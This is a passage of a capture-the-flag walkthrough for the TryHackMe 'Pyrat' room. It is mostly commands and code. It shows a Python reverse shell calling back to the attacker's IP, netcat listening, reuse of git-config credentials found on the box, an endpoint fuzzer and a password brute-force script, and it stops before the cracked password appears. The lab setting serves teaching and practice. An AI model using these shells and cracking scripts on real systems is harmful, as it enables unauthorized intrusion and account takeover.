### Port 8000

Based on the description of the room, the service Python executes via HTTP server is vulnerable. I used **`telnet`** to connect with the target server on port **`8000`** and perform a few attempts at the command line to verify it is running with Python syntax:

```
$ telnet pyrat.thm 8000
Trying 10.10.187.125...
Connected to pyrat.thm.
Escape character is '^]'.
?
invalid syntax (<string>, line 1)
help

print('hello')
hello

^C^]
telnet> quit
Connection closed.
```

Since the target service was verified, I use a **Python reverse shel**l to establish a connection back to my own machine:

```python
socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.68.89",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.68.89] from (UNKNOWN) [10.10.31.104] 49556
$
```

## Vulnerability Exploit

### Privilege Escalation 1

First of all, I spawned a **tty shell**:

```
$ whoami;id
whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
www-data@Pyrat:~$ export TERM=xterm
export TERM=xterm
www-data@Pyrat:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(kali㉿kali)-[~/TryHackMe/Pyrat]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
                               stty rows 38 columns 116
www-data@Pyrat:~$ pwd; ls -lht
/root

```

Navigate to **`home`** directory and easily found only 1 target user for the privilege escalation process:

```
www-data@Pyrat:/$ cd /home
www-data@Pyrat:/home$ ls -lht
total 4.0K
drwxr-x--- 5 think think 4.0K Jun 21  2023 think
```

However, the working directory of **`think`** user does not allow anyone else to access. Therefore, I start to find the relative files that belong to this user:

```
www-data@Pyrat:/home$ find / -user think -type f 2>/dev/null
/opt/dev/.git/objects/0a/3c36d66369fd4b07ddca72e5379461a63470bf

/opt/dev/.git/refs/heads/master
/opt/dev/.git/index
```

Navigate to the **`/opt/dev/.git`** directory, I continue to use **`grep`** command to verify whether there is any information that contains the username inside the git workplace, and luckily it it:

```
www-data@Pyrat:/home$ cd /opt/dev/.git/
www-data@Pyrat:/opt/dev/.git$ ls -lht
total 44K

www-data@Pyrat:/opt/dev/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true

        email = josemlwdf@github.com

        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
```

Despite there being the credentials of the github account, it probably would be re-used as the local password of this user on this machine. I decided to make an attempt, and one more time, it worked:

```
$ ssh think@pyrat.thm

### Privilege Escalation 2

Get back to the git repository, I use git command to enumerate the status and easily found an interested file:

```
think@Pyrat:/opt/dev/.git$ cd ../
think@Pyrat:/opt/dev$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
```

Simply restoring that file and try to understand the script:

```
think@Pyrat:/opt/dev$ git restore pyrat.py.old
```

```python
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................
```

From my understanding, if I hit the correct endpoint on port 8000, the server would response in different ways:

- “shell”: The server would establish a shell connection with pty.spawn just like I used the reverse script
- the other endpoints: could lead to another process that potentially leads me to escalate my privilege

So on, I write a simple script using an endpoint wordlist to send them to the target sever on port 8000:

```python
import socket

def fuzz_endpoints(ip, port, endpoints):
    for endpoint in endpoints:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, port))

            print(f"Testing: {endpoint}")
            client_socket.sendall(endpoint.encode() + b'\n')

            response = client_socket.recv(1024)
            print(f"Response from {endpoint}: {response.decode()}\n")

            client_socket.close()
        except Exception as e:
            print(f"Error with {endpoint}: {e}")

# List of potential endpoints to fuzz
endpoint_list = []

with open("/usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt", "r") as wordlist:
    endpoint_list.extend(wordlist.readlines())

# Target IP and port (replace with actual values)
target_ip = "pyrat.thm"
target_port = 8000

# Fuzz the endpoints
fuzz_endpoints(target_ip, target_port, endpoint_list)
```

And I successfully hit the correct endpoint after a minute:

```python
$ python3 fuzzing_endpoints.py
Testing: 0
Response from 0:

Testing: 1
Response from 1:

Testing: 1.0
Response from 1.0:

...

Testing: account
Response from account: name 'account' is not defined

Testing: accounts
Response from accounts: name 'accounts' is not defined

Testing: activate
Response from activate: name 'activate' is not defined

Testing: add
Response from add: name 'add' is not defined

Testing: address
Response from address: name 'address' is not defined

Testing: admin
Response from admin: Password:

```

However, the target server required a password. The following script would be used to crack the password within a wordlist:

```python
import socket
import time

# Define the target host and port
HOST = "pyrat.thm"
PORT = 8000

# File containing the passwords
password_file = "/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt"

# Set a timeout duration (in seconds)
TIMEOUT = 5

def socket_connect():
    # Establish a socket connection
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(TIMEOUT)  # Set timeout
        client_socket.connect((HOST, PORT))
        print(f"Connected to {HOST}:{PORT}")
        return client_socket
    except socket.timeout:
        print(f"Connection to {HOST}:{PORT} timed out.")
        return None
    except Exception as e:
        print(f"Failed to connect: {e}")
        return None

def login(client_socket):
    # Send the initial payload as 'admin'
    client_socket.sendall(b"admin\n")
    print("Sent username: admin")

    # Read server response after sending the username
    try:
        response = client_socket.recv(1024)
        print(response.decode('ascii'))
    except socket.timeout:
        print("Timeout during login step. No response from the server.")
        return False
    return True

def try_passwords(client_socket):
    # Open the password file
    with open(password_file, 'r') as f:
        for password in f:
            password = password.strip()  # Clean up newline characters
            if not password:
                continue

            try:
                # Send password to the server
                client_socket.sendall(password.encode('ascii') + b"\n")
                print(f"Trying password: {password}")

                # Read server response
                response = client_socket.recv(1024)
                decoded_response = response.decode('ascii')

                # Print the server response
                print(decoded_response)

                # Check if the password was accepted (no "password" prompt anymore)
                if "password" not in decoded_response.lower():
                    print(f"Password found: {password}")
                    break
            except socket.timeout:
                print("Timeout during password attempt. Re-establishing connection...")
                client_socket.close()
                client_socket = socket_connect()
                if client_socket:
                    if not login(client_socket):
                        break
                else:
                    break
            time.sleep(1)  # Avoid overwhelming the server with too many requests

def main():
    client_socket = socket_connect()
    if client_socket:
        if login(client_socket):
            try_passwords(client_socket)
        client_socket.close()

if __name__ == "__main__":
    main()

```

Waiting for the process and finally get the correct password:

```python
$ python3 crack_passwd.py
